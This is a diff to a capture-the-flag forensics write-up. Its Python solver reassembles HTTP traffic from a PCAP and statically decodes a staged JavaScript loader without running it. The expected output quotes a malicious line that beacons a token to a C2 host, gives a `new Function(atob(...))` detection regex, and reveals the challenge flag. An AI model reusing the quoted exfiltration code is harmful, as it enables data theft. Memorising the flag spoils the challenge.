@@ -20,26 +20,28 @@ Find what the portal actually planted.
 
 ## Solution
 
-### Steps
+### Analysis
 
-Reassemble TCP streams from the PCAP, parse HTTP responses including chunked/gzip bodies, identify the JavaScript loader, and Base64-decode its embedded stage without executing it.
+The PCAP holds ordinary web page traffic alongside the malicious stage. The key is not just to inspect the initial HTML: the browser fetches a JavaScript loader that decodes and evaluates a second stage.
+
+The solver reads the classic Ethernet PCAP, groups TCP segments by four-tuple, orders them by sequence number, and parses HTTP responses. It supports `Content-Length` and `Transfer-Encoding: chunked` as well as gzip-compressed response bodies. Only JavaScript responses are considered as possible loader sources.
+
+The detection criterion is the suspicious dynamic-execution pattern `new Function(atob(...))`: it takes Base64 text, decodes it, and passes the result into JavaScript's dynamic function constructor. Unlike the original solver, the revised detector does **not** rely on knowing the literal comment `Asimov Portal loader` in advance. The extracted Base64 value is decoded for static inspection; **the script does not execute the JavaScript**.
+
+The recovered second stage contains a `navigator.sendBeacon(...)` call to `cdn-sat-sync.net` and the flag, which is assigned to a JavaScript variable.
 
 ### Reproduction
 
-Run the supplied solver with the original challenge inputs in the paths expected by the source code.
+Place `drive_by.pcap` alongside `302.py` and run:
 
 ```bash
 python3 302.py
 ```
 
-Expected relevant output:
+Expected relevant output (long Base64 value omitted here):
 
 ```text
-HTTP JavaScript body: 17180 bytes, TCP 80 -> 50101
-HTTP JavaScript body: 477 bytes, TCP 80 -> 50103
-HTTP JavaScript body: 371 bytes, TCP 80 -> 50103
-HTTP JavaScript body: 333 bytes, TCP 80 -> 50103
-Found malicious loader:
+Found suspicious Base64-to-Function loader:
 /* Asimov Portal loader v3 */
 (function(){var p="...";var f=new Function(atob(p));f();})();
 
@@ -52,11 +54,15 @@ navigator.sendBeacon('https://'+cfg.c2+'/b',token);
 FLAG: GAIANSPACE{dr1ve_by_st4ged}
 ```
 
-### Exploit Code
+No third-party packages are required. The `new Function(atob(...))` pattern is an indicator for this capture, not a universal proof that any JavaScript containing it is malicious.
+
+### Solver Code
 
 ```python
 #!/usr/bin/env python3
 """Recover staged JavaScript from the GaianSpace 302 PCAP without executing it."""
+
+# Dependencies: Python 3 standard library only.
 import base64
 import gzip
 import re
@@ -180,9 +186,10 @@ def main() -> None:
             if b'javascript' not in header.lower():
                 continue
             print(f'HTTP JavaScript body: {len(body)} bytes, TCP {key[2]} -> {key[3]}')
-            if b'Asimov Portal loader' not in body:
+            # Flag dynamically evaluated Base64 payloads, not known comment strings.
+            if re.search(rb'new\s+Function\s*\(\s*atob\s*\(', body) is None:
                 continue
-            print('Found malicious loader:')
+            print('Found suspicious Base64-to-Function loader:')
             print(body.decode('utf-8', errors='replace')[:1000])
             match = re.search(rb'\b(?:var|let|const)\s+p\s*=\s*["\']([^"\']+)["\']', body)
             if not match:
